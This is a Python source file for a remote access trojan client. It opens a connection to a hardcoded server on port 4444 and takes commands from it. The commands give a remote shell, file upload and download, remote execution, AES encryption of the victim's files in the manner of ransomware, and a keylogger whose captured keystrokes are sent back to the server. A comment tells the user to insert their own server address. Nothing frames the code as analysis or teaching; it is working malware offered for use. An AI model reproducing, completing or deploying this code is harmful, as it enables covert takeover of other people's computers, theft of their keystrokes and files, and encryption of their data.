import socket
import subprocess
import os
import threading
import keyboard
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import string

HOST = '10.0.1.37'  # <-- Replace with your actual server IP
PORT = 4444

keylog_active = False
keylog_buffer = []

def encrypt_file(filename, key):
    key = key.encode('utf-8').ljust(32, b'\0')[:32]
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(filename, 'rb') as f:
        data = pad(f.read(), AES.block_size)
    encrypted = iv + cipher.encrypt(data)
    with open(filename + '.enc', 'wb') as f:
        f.write(encrypted)

def decrypt_file(filename, key):
    key = key.encode('utf-8').ljust(32, b'\0')[:32]
    with open(filename, 'rb') as f:
        iv = f.read(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(f.read()), AES.block_size)
    with open(filename + '.dec', 'wb') as f:
        f.write(decrypted)

def keylogger():
    def on_key(event):
        global keylog_buffer
        name = event.name

        if name in ['shift', 'ctrl', 'alt', 'caps lock', 'tab', 'esc', 'backspace']:
            return
        elif name == 'space':
            return
        elif name == 'enter':
            keylog_buffer.append('[enter]')
        elif len(name) == 1 and name in string.printable:
            keylog_buffer.append(name)
        # Ignore non-printable or modifier keys

    keyboard.on_press(on_key)

def handle_server(conn):
    global keylog_active
    while True:
        try:
            cmd = conn.recv(4096).decode()
            if not cmd:
                break
            if cmd.startswith("shell"):
                conn.send(b"Entering remote shell (type 'exit' to leave)...\n")
                while True:
                    cmd = conn.recv(4096).decode().strip()
                    if cmd == "exit":
                        break
                    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    conn.send(output.stdout.encode() + output.stderr.encode())
            elif cmd.startswith("upload "):
                _, filename = cmd.split(" ", 1)
                data = conn.recv(1000000)
                with open(filename, "wb") as f:
                    f.write(data)
                conn.send(b"File uploaded.\n")
            elif cmd.startswith("download "):
                _, filename = cmd.split(" ", 1)
                if os.path.exists(filename):
                    with open(filename, "rb") as f:
                        conn.send(f.read())
                else:
                    conn.send(b"File not found.\n")
            elif cmd.startswith("run "):
                _, filename = cmd.split(" ", 1)
                os.startfile(filename)
                conn.send(b"File executed.\n")
            elif cmd.startswith("encrypt "):
                _, filename, key = cmd.split(" ", 2)
                encrypt_file(filename, key)
                conn.send(b"Encrypted.\n")
            elif cmd.startswith("decrypt "):
                _, filename, key = cmd.split(" ", 2)
                decrypt_file(filename, key)
                conn.send(b"Decrypted.\n")
            elif cmd == "keymon":
                keylog_active = True
                conn.send(b"Keylogger started.\n")
            elif cmd == "keymon_stop":
                keylog_active = False
                conn.send(b"Keylogger stopped.\n")
            elif cmd == "keydump":
                output = ''.join(keylog_buffer)
                conn.send(f"KeyDumper: {output}\n".encode())
            else:
                conn.send(b"Unknown command.\n")
        except Exception as e:
            conn.send(f"Error: {str(e)}\n".encode())

def main():
    sock = socket.socket()
    sock.connect((HOST, PORT))
    threading.Thread(target=keylogger, daemon=True).start()
    handle_server(sock)

if __name__ == "__main__":
    main()
